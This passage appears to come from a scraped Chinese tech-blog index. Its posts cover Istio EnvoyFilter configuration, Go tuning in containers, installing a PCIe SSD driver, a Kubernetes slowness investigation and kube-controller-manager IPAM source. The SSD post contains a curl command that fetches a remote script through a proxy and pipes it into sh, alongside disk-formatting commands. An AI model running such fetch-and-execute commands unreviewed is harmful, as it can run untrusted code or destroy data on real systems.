NAMESPACE NAME AGE istio-system add-request-id-into-ingressgateway 54d istio-system compression-gzip 18d istio-system custom-access-log 3d istio-system ingressgateway-settings 52d istio-system preserve-request-header-us-test-ingress-gateway 95d istio-system preserve-x-request-id 54d 通常在使用 istio 时，或多或少都会用到一些 EnvoyFilter。\nEnvoyFilter 提供的功能是基于 Envoy 已有的内置功能和扩展机制来实现的，主要包括:\n修改网络请求和响应 限流和熔断 重试 修改路由规则 增加额外的监控指标 访问黑白名单控制 执行 lua 脚本 \u0026hellip; 能够满足大部分的四层、七层的需求，如果满足不了，可以上 WasmPlugin，之前写过一篇 使用 tinygo 开发 Istio WasmPlugin\n可以参考。\n2. EnvoyFilter 注意事项 不正确的配置可能会破坏整个网格的稳定性，使用 EnvoyFilter 需要十分谨慎。\nEnvoyFilter 生效的范围:\n全局生效，根命名空间中的 EnvoyFilter。根命名空间在配置文件中有，默认 rootNamespace: istio-system 指定命名空间生效，创建在指定命名空间中的 EnvoyFilter EnvoyFilter 优先级:\n根命名空间中的配置 \u0026gt; 其他命名空间中的配置 EnvoyFilter 生效顺序:\n按照创建时间依次应用 3. EnvoyFilter 配置字段 先看一个例子，给经过 Istio Gateway 的 Reponse 进行 Gzip 压缩。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 apiVersion: networking.istio.io/v1alpha3 kind: EnvoyFilter metadata: name: compression-gzip namespace: istio-system spec: workloadSelector: labels: app: istio-ingressgateway configPatches: - applyTo: HTTP_FILTER match: context: GATEWAY listener: filterChain: filter: name: \u0026#34;envoy.filters.network.http_connection_manager\u0026#34; subFilter: name: \u0026#34;envoy.filters.http.router\u0026#34; patch: operation: INSERT_BEFORE value: name: envoy.filters.http.compressor typed_config: \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.http.compressor.v3.Compressor response_direction_config: common_config: min_content_length: 256 content_type: - application/atom+xml - application/javascript - application/x-javascript - application/json - application/rss+xml - application/vnd.ms-fontobject - application/x-font-ttf - application/x-web-app-manifest+json - application/xhtml+xml - application/xml - font/opentype - image/svg+xml - image/x-icon - text/css - text/javascript - text/plain - text/x-component compressor_library: name: text_optimized typed_config: \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.compression.gzip.compressor.v3.Gzip memory_level: 3 compression_level: COMPRESSION_LEVEL_6 简单说下关键字段\napplyTo 应用的过滤层，这里指向的是 HTTP 层的过滤\nworkloadSelector 指定了生效的 Pod，如果没有设置 workloadSelector，则对整个命名空间生效。\nmatch.context 有四个可选值 ANY 全局生效、SIDECAR_INBOUND sidecar 入站生效、SIDECAR_OUTBOUND sidecar 出站生效、GATEWAY 网关生效。\nlistener.filterChain.filter 指定了过滤器链中的过滤器，这里指向的是 Envoy 的 HTTP 过滤器。\n相关的字段可以参考下图:\n4. EnvoyFilter 相关的指标监控 在 Sidecar 或者 Gateway 中，本地会暴露一些指标，可以配置 Prometheus 来采集这些指标。\n如果需要访问相关指标，可以通过如下接口:\n1 curl 127.0.0.1:15020/stats/prometheus 但此时，不一定有你需要的指标，因为 Istio 仅启用了 Envoy 小部分的指标，以避免采集端负担过重。如果要启用更多的指标，可以通过修改相关配置来实现。\n4.1 三种规则匹配模式 Istio 提供了三种过滤指标的规则:\ninclusionRegexps, 启用正则匹配的指标 inclusionPrefixes, 启用前缀匹配的指标 inclusionSuffixes, 启用后缀匹配的指标 4.2 两个配置级别 全局级别 修改 istio ConfigMap 中的 mesh 字段\n1 kubectl edit cm istio -n istio-system 1 2 3 4 5 6 7 8 9 10 11 12 13 kind: ConfigMap apiVersion: v1 metadata: name: istio namespace: istio-system data: mesh: |- defaultConfig: proxyStatsMatcher: inclusionRegexps: - \u0026#34;.*http.*\u0026#34; gatewayTopology: numTrustedProxies: 1 启用所有 HTTP 相关的指标，重启 Istio Gateway 生效。在测试环境中，Metrics 采集的数据从 90MB 一下就升到了 140 MB。\nPod 级别 1 2 3 4 5 6 7 8 9 apiVersion: v1 kind: Pod metadata: name: test annotations: proxy.istio.io/config: |- proxyStatsMatcher: inclusionRegexps: - \u0026#34;.*http.*\u0026#34; 这种就只对注入了 sidecar 的 pod 生效。\n5. 总结 本篇主要是介绍了 EnvoyFilter 的基本概念和使用方法，以及 EnvoyFilter 相关的指标监控。\n6. 参考 https://istio.io/latest/docs/reference/config/networking/envoy-filter/ ","description":"","id":87,"section":"post","tags":["博文","Istio","EnvoyFilter","配置"],"title":"Istio 中的 EnvoyFilter 配置","uri":"https://www.chenshaowen.com/blog/configurate-envoyfilter-in-istio.html"},{"content":"1. 内存对齐 结构体内字段，从大到小排列\n减少内存占用\n安装 fieldalignment 工具 1 go install golang.org/x/tools/go/analysis/passes/fieldalignment/cmd/fieldalignment@latest 分析并修复内存对齐 1 2 3 4 5 6 7 8 9 fieldalignment -fix ./... /Users/shaowenchen/Code/app/config/config.go:136:14: struct with 32 pointer bytes could be 24 /Users/shaowenchen/Code/app/config/config.go:150:11: struct of size 96 could be 88 /Users/shaowenchen/Code/app/config/config.go:166:14: struct of size 152 could be 144 /Users/shaowenchen/Code/app/config/config.go:194:12: struct with 80 pointer bytes could be 72 /Users/shaowenchen/Code/app/config/config.go:209:12: struct with 56 pointer bytes could be 40 /Users/shaowenchen/Code/app/dao/gormx/gorm.go:12:13: struct with 16 pointer bytes could be 8 /Users/shaowenchen/Code/app/dao/gormx/entity/cluster.go:5:14: struct with 128 pointer bytes could be 104 查看 fieldalignment 进行的优化 优化之前，struct of size 96\n1 2 3 4 5 6 7 8 type CORS struct { Enable bool AllowOrigins []string AllowMethods []string AllowHeaders []string AllowCredentials bool MaxAge int } 优化之后，struct of size 88\n1 2 3 4 5 6 7 8 type CORS struct { AllowOrigins []string AllowMethods []string AllowHeaders []string MaxAge int Enable bool AllowCredentials bool } fieldalignment 会自动结构体中的字段进行排序，从大到小排列。\n原因是 Go 编译器在编译阶段，出于对 CPU 访问效率的考虑，保证尽量一次原子读取就可以读取一个完整字段，采用了一定的内存对齐策略。但这一策略会导致内存中的结构体存在空洞，导致内存占用率增加。\n2. 设置合理的 GOMAXPROCS 写一个程序，获取当前 CPU 核心数，查看当前 GOMAXPROCS 的值\n1 2 3 4 5 6 func main() { cpu := runtime.NumCPU() fmt.Println(\u0026#34;Current CPU COUNT =\u0026#34;, cpu) maxProcs := runtime.GOMAXPROCS(-1) fmt.Println(\u0026#34;Current GOMAXPROCS =\u0026#34;, maxProcs) } Pod Request CPU 为 10，Limit CPU 为 20。\n1 2 Current CPU COUNT = 32 Current GOMAXPROCS = 32 GOMAXPROCS 的值为物理机的 CPU 核心数，而不是容器的 CPU 核心数。过大的 GOMAXPROCS 会导致严重的上下文切换，浪费 CPU，在容器环境下，Go 程序不能最优设置 GOMAXPROCS，需要根据容器的 CPU 核心数来设置。\n第一种方式是，设置环境变量 GOMAXPROCS 可以指定最大的 P 的数量 1 export GOMAXPROCS=8 1 2 Current CPU COUNT = 32 Current GOMAXPROCS = 8 程序会自动从环境变量中读取 GOMAXPROCS 的值进行设置。\n第二种方式是，使用 automaxprocs 包自动设置 GOMAXPROCS。 1 2 3 4 import _ \u0026#34;go.uber.org/automaxprocs\u0026#34; func main() { // ... } 引入包之后，会自动执行 init 方法，获取 Pod 的 CPU Limit 值，设置 GOMAXPROCS。\n1 2 3 4 ./default maxprocs: Updating GOMAXPROCS=20: determined from CPU quota Current CPU COUNT = 32 Current GOMAXPROCS = 20 如果同时使用两种，环境变量的优先级高于 automaxprocs 包。\n1 export GOMAXPROCS=8 1 2 3 maxprocs: Honoring GOMAXPROCS=\u0026#34;8\u0026#34; as set in environment Current CPU COUNT = 32 Current GOMAXPROCS = 8 ","description":"","id":88,"section":"post","tags":["博文","Go","性能优化","容器","最佳实践"],"title":"容器下的 Go 应用程序优化","uri":"https://www.chenshaowen.com/blog/optimization-go-applications-in-containers.html"},{"content":"1. 查看 PCI 接口设备 使用 lspci 查看设备是否已经安装\n1 2 3 lspci |grep storage d8:00.0 Mass storage controller: Shannon Systems Device 2275 这里发现了一块 Shannon Systems 的设备，说明已经安装了 SSD。\n1 2 3 4 5 6 7 8 lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 893.8G 0 disk ├─sda1 8:1 0 1M 0 part ├─sda2 8:2 0 1G 0 part /boot └─sda3 8:3 0 892.8G 0 part └─ubuntu--vg-ubuntu--lv 253:0 0 892.8G 0 lvm / 但 lsblk 中并没有看到对应的设备，说明驱动没有安装或者安装错误。\n2. 检查是否已安装驱动 这一步骤很关键，如果安装了版本不对、内核版本不匹配的驱动，在 lsblk 中也可能看不到对应的设备。如果安装了两个版本的驱动，可能会导致系统无法正常启动，一直 rebooting。\n检查是否已经安装 SSD 驱动 1 2 3 dpkg -l | grep shannon ii shannon-module-5.4.0-164-generic 3.4.3.1 amd64 Driver for PCIe SSD of Shannon Systems 3. 卸载 SSD 驱动 需要注意的是，如果 lsblk 已经能看到设备，那么代表着驱动已经正确安装，同时很有可能已经在使用中，如果此时卸载驱动，会导致系统故障。\n卸载驱动 1 dpkg -r shannon-module-5.4.0-164-generic 4. 安装驱动 准备驱动源码包 1 2 3 ls -alh Shannon_Linux_Driver_Package_3.4.3.1.tar.gz -rw-r--r-- 1 root root 11M Nov 8 07:57 Shannon_Linux_Driver_Package_3.4.3.1.tar.gz 解压驱动源码包 1 2 tar xvf Shannon_Linux_Driver_Package_3.4.3.1.tar.gz cd Shannon_Linux_Driver_Package_3.4.3.1 1 2 tar xvf shannon-source_3.4.3.1.tar.gz cd shannon-source_3.4.3.1 安装编译环境 1 apt-get install -y make gcc debhelper linux-headers-$(uname -r) libtinfo5 libncurses5 安装 dpkg-dev 工具 1 apt-get install -y dpkg-dev 编译生成 DEB 包 1 dpkg-buildpackage -us -uc 得到 DEB 包\n1 dpkg-deb: building package \u0026#39;shannon-module-5.4.0-164-generic\u0026#39; in \u0026#39;../shannon-module-5.4.0-164-generic_3.4.3.1_amd64.deb\u0026#39;. 安装驱动 1 dpkg -i ../shannon-module-5.4.0-164-generic_3.4.3.1_amd64.deb 查看 SSD 块设备 1 2 3 4 5 6 7 8 9 10 lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 893.8G 0 disk ├─sda1 8:1 0 1M 0 part ├─sda2 8:2 0 1G 0 part /boot └─sda3 8:3 0 892.8G 0 part └─ubuntu--vg-ubuntu--lv 253:0 0 892.8G 0 lvm / dfa 252:0 0 2.2T 0 disk └─dfa1 252:1 0 2T 0 part 5. 格式化并挂载到目录 磁盘分区 使用 fdisk 对 dfa 进行分区\n1 fdisk /dev/dfa 会有提示输入参数：\ncommand (m for help):n\nSelect (default p): p\nPartition number(1-4):1\nFirst cylinder (1-22800,default 1):Enter\ncommand (m for help):w\n格式化分区 1 mkfs.ext4 /dev/dfa 创建挂载点目录 1 mkdir /data 挂载硬盘到目录 1 mount -t ext4 /dev/dfa /data 设置自动挂载 在 /etc/fstab 中添加一条记录,设置开机自动挂载:\n1 /dev/dfa /data ext4 defaults 0 0 6. 验证磁盘正常挂载 验证开机自动挂载 重新挂载分区，如果没有报错，说明配置正确\n1 mount -a 验证磁盘正常挂载 1 2 3 4 5 6 7 8 9 10 lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 893.8G 0 disk ├─sda1 8:1 0 1M 0 part ├─sda2 8:2 0 1G 0 part /boot └─sda3 8:3 0 892.8G 0 part └─ubuntu--vg-ubuntu--lv 253:0 0 892.8G 0 lvm / dfa 252:0 0 2.2T 0 disk /data └─dfa1 252:1 0 2T 0 part 7. 磁盘测试 安装 opscli 1 2 proxy=\u0026#34;https://ghproxy.chenshaowen.com/\u0026#34; curl -sfL \u0026#34;$proxy\u0026#34;https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh |VERSION=latest sh - 安装 fio 1 apt-get install -y fio 开始测速 1 2 3 4 5 6 7 8 opscli task -f .ops/tasks/get-diskio-byfio.yaml Rand_Read_Testing: (groupid=0, jobs=1): err= 0: pid=21980: Thu Nov 9 07:05:26 2023 read: IOPS=113k, BW=441MiB/s (462MB/s)(100MiB/227msec) Rand_Write_Testing: (groupid=0, jobs=1): err= 0: pid=22027: Thu Nov 9 07:05:27 2023 write: IOPS=103k, BW=403MiB/s (423MB/s)(100MiB/248msec); 0 zone resets 8. 宝存驱动下载 https://github.com/shaowenchen/demo/tree/master/driver\n相关的文件主要有三个:\ndriver/Shannon_Linux_Driver_Package_3.4.3.1.tar.gz , 驱动源码包 driver/shannon-utils_3.4.3.2_amd64.deb, 驱动工具包 driver/UG201Direct-IO_PCIe_SSD用户手册_user_manual_rv2.6.docx, 用户手册 ","description":"","id":89,"section":"post","tags":["博文","DSM","磁盘"],"title":"安装并初始化 PCI 接口的 SSD","uri":"https://www.chenshaowen.com/blog/how-to-intialize-pci-ssd.html"},{"content":"1. 现象 业务反馈应用 app-a 的接口慢，查看日志发现是某一个 Pod 慢，删除该 Pod 让其更换节点就好。\n从监控指标可以看到，Pod 的 CPU 使用率确实有剧增。\n但该 Pod 没有达到 Limit 的限制，没有被限流 CPU。\n接着看节点的 CPU 监控，发现节点的 CPU 使用率也有剧增。\n并且增加的部分是 System CPU，也就是内核态的 CPU。\n进一步，确定增加的部分是 System CPU，也就是内核态的 CPU。\n使用内核态 CPU 的主要场景有网络、磁盘 IO 等。\n2. 排查问题 2.1 排查磁盘 IO iowait 高并不意味着磁盘 IO 高，iowait 高只是说明 CPU 等待 IO 的时间长，但是并不一定是因为磁盘 IO 高导致的，也可能是网络 IO 高所致。但 iowait 低则能判断出磁盘 IO 压力小。\n从上面的监控可以看到 CPU 的 iowait 低，说明磁盘没有瓶颈。\n另外，从监控指标可以看到，磁盘 IO 速度、IOPS 也都没有异常波动。\n也可以结合磁盘设备平均 IO 队列数、读延迟、写延迟等指标继续确认磁盘 IO 是否有异常。\n至此，基本排除了磁盘 IO 的瓶颈。\n2.2 排查网络 IO 网络 IO 先看节点 Node 的进出流量，再找异常流量的 Pod。\n从监控可以看到，节点的网络 IO 有异常波动，从 500 Mbps 到 800 Mbps 。\n接着找到这个节点上流量异常的 Pod。\n2.3 找到问题 很快，我就从监控系统中找出了这个 Pod。\n时间点上很符合，大量的网络 IO、CPU 使用剧增。\n原来是应用 app-b，在 HPA 扩容调度时，恰好调度到了这个节点上，导致这个节点的网络 IO、CPU 使用剧增，影响到了延时敏感的应用 app-a，导致应用 app-a 的接口慢。\n2.4 解决问题 解决办法就是利用 Pod 的反亲和性，将应用 app-a 和应用 app-b 从调度层隔离开来，不让其同时存在于一个节点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kind: Deployment name: app-a spec: spec: restartPolicy: Always affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - app-b topologyKey: kubernetes.io/hostname 至此，应用 app-a 慢的情况比之前改善了很多，但还是会偶尔出现慢的情况。于是，我继续花了点时间排查。\n3. 为什么 Pod CPU 没有被限流 我一度怀疑应用 app-a 的 Pod CPU 有被限流，监控指标没有反应出来而已。但排查了一段时间后，我并没有发现相关的证据。这个猜测可能是错误的。\n3.1 K8s 中的 CFS 限流机制 CFS 是 Linux 内核中用来实现 CPU 带宽控制的一种机制，它可以设定一个进程组可使用的 CPU 时间的上限。\n通常，CPU 使用的的计量周期为 100ms。CPU Limit 决定了每个计量周期，也就是 100ms 时间内，可以使用的 CPU 时间上限。\n1 CPU 代表着 100ms 内，可以使用 1 个核心的 CPU 时间；2 CPU 代表着 100ms 内，可以使用 2 个核心的 CPU 时间。但如果是 0.5 CPU，代表着 100ms 内，就不是 0.5 个核心的 CPU 时间，而是 50ms 的 CPU 时间，因为 CPU 的核心是整数，不能分割，能分割的是占用时间。\n这里其实并不会涉及使用率的问题，无论应用将 CPU 用来计算、还是闲置，都会被计算在内。\n如果 CPU 使用超过了 CPU Limit 规定的时间，就会被限制使用。这里其实还有一个细节就是，多久调度一次 CPU 的使用。这也是我非常感兴趣的一个问题，在后面的文章中，我会继续分析。\n3.2 kubelet 对 Pod CPU 指标的采集 Prometheus 中的服务发现配置 1 2 3 4 5 6 7 8 9 10 11 12 13 job_name: kubernetes-nodes-cadvisor kubernetes_sd_configs: - role: node relabel_configs: - action: labelmap regex: __meta_kubernetes_node_label_(.+) - replacement: kubernetes.default.svc:443 target_label: __address__ - regex: (.+) replacement: /api/v1/nodes/$1/proxy/metrics/cadvisor source_labels: - __meta_kubernetes_node_name target_label: __metrics_path__ 数据采集的链路是 cAdvisor -\u0026gt; kubelet -\u0026gt; kube-apiserver -\u0026gt; Prometheus。\ncAdvisor 对 CPU 指标的采集 CPU 限流的指标主要是 container_cpu_cfs_throttled_seconds_total 这是 cAdvisor 源码中的定义:\n1 2 3 4 5 6 7 8 9 10 11 12 { name: \u0026#34;container_cpu_cfs_throttled_seconds_total\u0026#34;, help: \u0026#34;Total time duration the container has been throttled.\u0026#34;, valueType: prometheus.CounterValue, condition: func(s info.ContainerSpec) bool { return s.Cpu.Quota != 0 }, getValues: func(s *info.ContainerStats) metricValues { return metricValues{ { value: float64(s.Cpu.CFS.ThrottledTime) / float64(time.Second), timestamp: s.Timestamp, }} } cAdvisor 获取 CPU 指标的方式:\n1 2 3 spec.Cpu.Limit = readUInt64(cpuRoot, \u0026#34;cpu.shares\u0026#34;) spec.Cpu.Period = readUInt64(cpuRoot, \u0026#34;cpu.cfs_period_us\u0026#34;) quota := readString(cpuRoot, \u0026#34;cpu.cfs_quota_us\u0026#34;) 内核会动态修改这些容器文件，cAdvisor watch 了这些文件变化，当有文件创建时，说明有新的容器创建；当有文件变更时，说明指标发生了变化，这些都会触发指标的采集。\n在容器中，可以看到这些文件:\n1 2 3 4 5 ls /sys/fs/cgroup/cpu cgroup.clone_children cpu.cfs_quota_us cpu.shares cpuacct.usage cpuacct.usage_percpu_sys cpuacct.usage_user cgroup.procs cpu.rt_period_us cpu.stat cpuacct.usage_all cpuacct.usage_percpu_user notify_on_release cpu.cfs_period_us cpu.rt_runtime_us cpuacct.stat cpuacct.usage_percpu cpuacct.usage_sys tasks 其中与 CPU 限流相关的文件是\ncpu.cfs_period_us cpu.cfs_quota_us 1 2 3 cat /sys/fs/cgroup/cpu/cpu.cfs_period_us 100000 这里的 100000 微秒，也就是 100 ms，即一个 CPU 上 cfs 控制程序使用的周期。\n1 2 3 cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 200000 这里的 200000 微秒，也就是 200 ms，cfs_quota_us 表示总的时间周期，这里的含义是可以同时两个 CPU 核心的 100 ms 时间。\n而限流指标存储在这里:\n1 2 3 4 5 cat /sys/fs/cgroup/cpu/cpu.stat nr_periods 2759610 nr_throttled 5592 throttled_time 30204498882 其中，\nnr_periods 已经使用的周期数 nr_throttled 被限制的周期数 throttled_time 被限制的时钟长度，单位纳秒 在 Pod 的监控指标中，可以看到:\nPrometheus 对指标的抓取 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 prometheus.yml: | global: evaluation_interval: 1m external_labels: cluster: mycluster scrape_interval: 60s scrape_timeout: 20s remote_write: - queue_config: batch_send_deadline: 2s capacity: 5000 max_backoff: 5s max_samples_per_send: 500 min_backoff: 100ms max_shards: 10000 remote_timeout: 120s url: http://victoria-metrics-insert/insert/0/prometheus 抓取周期较长，为 60s，对于 Counter 类型的指标只会损失精度，而不会错过特征，这与 Gauge 形成了鲜明的对比。\n从采集到抓取，没有发现可能错过 CPU 限流监控的地方。\n3.3 告警系统会不会错过异常特征 在告警系统中，使用的是 irate 并且时间段是 10s。10s 间隔能看到更多细节，如下图:\n但不利于监控告警，rate 能查看到趋势，5m 间隔有利于监控告警。\n因此可能，有一些 CPU 限流的毛刺，告警系统不能检测到。\n但很遗憾的是，在这个场景下，我反复找了很多次，没有发现 CPU 限流的毛刺。\n4. 会不会是网络流量转发慢 4.1 kube-proxy 中的异常日志 这里有一段异常的日志引起来了我的注意。\n1 2 3 4 5 6 7 8 9 10 11 12 E1103 07:33:18.156949 1 proxier.go:900] Failed to ensure that nat chain KUBE-MARK-DROP exists: error creating chain \u0026#34;KUBE-MARK-DROP\u0026#34;: exit status 4: Another app is currently holding the xtables lock; still 4s 100000us time ahead to have a chance to grab the lock... Another app is currently holding the xtables lock; still 3s 100000us time ahead to have a chance to grab the lock... Another app is currently holding the xtables lock; still 2s 100000us time ahead to have a chance to grab the lock... Another app is currently holding the xtables lock; still 1s 100000us time ahead to have a chance to grab the lock... Another app is currently holding the xtables lock; still 0s 100000us time ahead to have a chance to grab the lock... Another app is currently holding the xtables lock. Stopped waiting after 5s. I1103 07:33:18.157007 1 proxier.go:876] Sync failed; retrying in 30s I1103 07:33:28.798252 1 trace.go:205] Trace[1195266045]: \u0026#34;iptables save\u0026#34; (03-Nov-2023 07:33:26.573) (total time: 2225ms): Trace[1195266045]: [2.225081921s] [2.225081921s] END I1103 07:33:31.892549 1 trace.go:205] Trace[964002782]: \u0026#34;iptables restore\u0026#34; (03-Nov-2023 07:33:28.966) (total time: 2925ms): Trace[964002782]: [2.925513421s] [2.925513421s] END I1103 07:33:43.900533 1 trace.go:205] Trace[431351666]: \u0026#34;iptables restore\u0026#34; (03-Nov-2023 07:33:40.759) (total time: 3141ms): 原来 kube-proxy 挂载了 /run/xtables.lock，以此仅有一个地方能够操作 iptables。\n1 2 3 4 5 volumeMounts: - name: kube-proxy mountPath: /var/lib/kube-proxy - name: xtables-lock mountPath: /run/xtables.lock 如果主机有其他进程也在操作 iptables，kube-proxy 就会等待。但这个日志时不时出现一次，并且也不符合异常时的时间点。\n4.2 kube-proxy 启动配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 cat /var/lib/kube-proxy/config.conf apiVersion: kubeproxy.config.k8s.io/v1alpha1 bindAddress: 0.0.0.0 bindAddressHardFail: false clusterCIDR: 10.239.0.0/16 configSyncPeriod: 15m0s conntrack: maxPerCore: 32768 min: 131072 tcpCloseWaitTimeout: 1h0m0s tcpEstablishedTimeout: 24h0m0s detectLocalMode: \u0026#34;\u0026#34; enableProfiling: false healthzBindAddress: 0.0.0.0:10256 hostnameOverride: \u0026#34;\u0026#34; iptables: masqueradeAll: false masqueradeBit: 14 minSyncPeriod: 0s syncPeriod: 30s mode: iptables 其中，syncPeriod 意味着每隔 30s 全量同步一次 iptables 规则。那么，如果没有同步完成，碰到了下一个 30s 的同步周期，会怎么样呢？\n4.3 kube-proxy 更新 iptables 真的很慢 应用 app-b 会大批量下载文件并存储在内存中，导致节点的网络 IO 压力、NF_CONNTRACK 表项、节点的 CPU 压力都剧增。\n虽然 Kube-proxy 没有重启、没有 OOMKilled，但 kube-proxy 的 kubeproxy_network_programming_duration_seconds_bucket P99 指标却有异常波动。如下图:\nkube-proxy 同步 iptables 规则慢，可能会导致 Pod 的流量摘除不及时，将流量转发到不存在的 Pod 上。\n但应用 app-a 异常 timeout 时，并没有 Pod 的重新调度、Pod IP 发生变化的情况发生。\n接着，我看了下 nf_conntrack table 的监控值，也没有满，而且上限极高。\n至此，我浪费了很多时间，也没有找到问题的根源。\n5. 应用使用 CPU 推理慢 幸运的是，我不仅是 SRE 还负责开发 CICD，直接就去翻了下应用 app-a 的代码。原来应用 app-a 使用 PyTorch 框架在 CPU 上运行推理。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 self.vocab = pickle.load(open(os.path.join(env.LOCAL_DATA_DIR, \u0026#39;vocab_xxx.pkl\u0026#39;), \u0026#39;rb\u0026#39;)) cpu_num = env.CPU_NUM cpu_num = int(cpu_num) if cpu_num \u0026gt; 0: os.environ[\u0026#34;OMP_NUM_THREADS\u0026#34;] = str(cpu_num) torch.set_num_threads(cpu_num) self.device = torch.device(\u0026#39;cpu\u0026#39;) self.model_path = os.path.join(env.CLOUD_DATA_DIR, \u0026#34;xxx_model.ckpt\u0026#34;) config = Config() config.n_vocab = len(self.vocab) self.model = xxx_model.Model(config) self.model = self.model.to(config.device) if os.path.exists(self.model_path): self.model.load_state_dict(torch.load(self.model_path, map_location=torch.device(\u0026#34;cpu\u0026#34;)), False) else: raise Exception(\u0026#34;Model file not exists\u0026#34;) CPU 运行的推理应用与普通应用不同:\n虽然提供了大量的 CPU，但 CPU 使用率很低，同时有大量推理任务依然需要 3-257s，高峰期慢推理能达到 800 /秒。\n至此，没有其他线索了，并不全是 IaaS 层资源的问题，主要是 CPU 扛不住低延时、大吞吐的推理任务。\n6. 总结 本篇主要是记录了一次应用慢的排查过程。最后没有找到问题的根源，但发现了不少目前大集群的问题。\n排查应用慢时的思路主要如下:\nCPU 限流，看 Pod 的 CPU 指标、节点的 CPU 指标是否有异常 磁盘 IO 慢，看 iowait、iops、io 队列数、读写延迟等是否有异常 网络慢，沿着流量路径，查看网络指标是否有异常 应用依赖的服务，本篇中的 app-a 没有外部依赖，因此跳过了这个环节 由于这次碰到的是一个推理应用，其实还会涉及输入文本的长度、BATCH_SIZE 大小、模型的复杂度等因素，但这些因素都是应用层的问题，不在本篇的讨论范围。\n","description":"","id":90,"section":"post","tags":["博文","CPU","网络","应用","排查","故障"],"title":"从 CPU 到网络记录一次排查应用慢的过程","uri":"https://www.chenshaowen.com/blog/record-a-troubleshooting-process-for-application-slowness.html"},{"content":"1. kube-controller-manager 对网段的管理 在 kube-controller-manager 有众多控制器，与 Pod IP 相关的是 NodeIpamController。\nNodeIpamController 控制器主要是管理节点的 podcidr，当有新节点加入集群时，分配一个子网段给节点；当节点删除时，回收子网段。\n每个节点的子网段不会重叠，每个节点都能够独立地完成 Pod IP 的分配。\n下面看一个 kube-controller-manager 的运行示例:\n1 kubectl -n kube-system get pod kube-controller-manager -o yaml 其中关于网段配置的部分为:\n1 2 3 4 5 6 7 8 spec: containers: - command: - kube-controller-manager - --allocate-node-cidrs=true - --cluster-cidr=10.234.0.0/16 - --node-cidr-mask-size=24 - --service-cluster-ip-range=10.96.0.0/16 cluster-cidr 指定了 Pod IP 的范围，掩码位数 16，如果不考虑保留 IP，意味着集群最多可以容纳 2^16 = 65536 个 pod。\n这些 Pod 分布在若干个节点上，接着看 node-cidr-mask-size 为 24，每个节点只剩下 32-24=8 位留给 pod，每个节点最多能创建 2^8=256 个 pod。\n相应的，这个集群能够容纳的节点数量为 2^(32-16-8)=256 个节点。\n在规划集群时，需要根据集群的规模来调整这两个参数。\n开启 allocate-node-cidrs、设置 cluster-cidr 之后，kube-controller-manager 会给每个节点分配子网段，将结果写入 spec.podCIDR 字段。\n1 2 3 4 spec: podCIDR: 10.234.58.0/24 podCIDRs: - 10.234.58.0/24 下面我们从源码分析一下这一过程。\n1. 启动 NodeIpamController 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 func startNodeIpamController(ctx context.Context, controllerContext ControllerContext) (controller.Interface, bool, error) { // 如果 allocate-node-cidrs 没有开启会立即返回 if !controllerContext.ComponentConfig.KubeCloudShared.AllocateNodeCIDRs { return nil, false, nil } // 获取 clusterCIDR, serviceCIDR 启动 NodeIpamController nodeIpamController, err := nodeipamcontroller.NewNodeIpamController( ctx, controllerContext.InformerFactory.Core().V1().Nodes(), clusterCIDRInformer, controllerContext.Cloud, controllerContext.ClientBuilder.ClientOrDie(\u0026#34;node-controller\u0026#34;), clusterCIDRs, serviceCIDR, secondaryServiceCIDR, nodeCIDRMaskSizes, ipam.CIDRAllocatorType(controllerContext.ComponentConfig.KubeCloudShared.CIDRAllocatorType), ) go nodeIpamController.RunWithMetrics(ctx, controllerContext.ControllerManagerMetrics) return nil, true, nil } RunWithMetrics 只是提供了一些监控指标，真正的启动逻辑在 Run 方法中。\n1 2 3 4 5 func (nc *Controller) RunWithMetrics(ctx context.Context, controllerManagerMetrics *controllersmetrics.ControllerManagerMetrics) { controllerManagerMetrics.ControllerStarted(\u0026#34;nodeipam\u0026#34;) defer controllerManagerMetrics.ControllerStopped(\u0026#34;nodeipam\u0026#34;) nc.Run(ctx) } 1 2 3 4 5 6 7 8 9 func (nc *Controller) Run(ctx context.Context) { if nc.allocatorType == ipam.IPAMFromClusterAllocatorType || nc.allocatorType == ipam.IPAMFromCloudAllocatorType { go nc.legacyIPAM.Run(ctx) } else { go nc.cidrAllocator.Run(ctx) } \u0026lt;-ctx.Done() } 1.2 监听节点变化 在查找 cidrAllocator 接口实现的时候，我发现了三种 CIDR 分配器，分别是 RangeAllocator 适用单网段分配、MultiCIDRRangeAllocator 适用于多 CIDR、CloudCIDRAllocator 适用于对接云厂。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func New(ctx context.Context, kubeClient clientset.Interface, cloud cloudprovider.Interface, nodeInformer informers.NodeInformer, clusterCIDRInformer networkinginformers.ClusterCIDRInformer, allocatorType CIDRAllocatorType, allocatorParams CIDRAllocatorParams) (CIDRAllocator, error) { switch allocatorType { case RangeAllocatorType: return NewCIDRRangeAllocator(logger, kubeClient, nodeInformer, allocatorParams, nodeList) case MultiCIDRRangeAllocatorType: if !utilfeature.DefaultFeatureGate.Enabled(features.MultiCIDRRangeAllocator) { return nil, fmt.Errorf(\u0026#34;invalid CIDR allocator type: %v, feature gate %v must be enabled\u0026#34;, allocatorType, features.MultiCIDRRangeAllocator) } return NewMultiCIDRRangeAllocator(ctx, kubeClient, nodeInformer, clusterCIDRInformer, allocatorParams, nodeList, nil) case CloudAllocatorType: return NewCloudCIDRAllocator(logger, kubeClient, cloud, nodeInformer) default: return nil, fmt.Errorf(\u0026#34;invalid CIDR allocator type: %v\u0026#34;, allocatorType) } } 这里看看 RangeAllocator 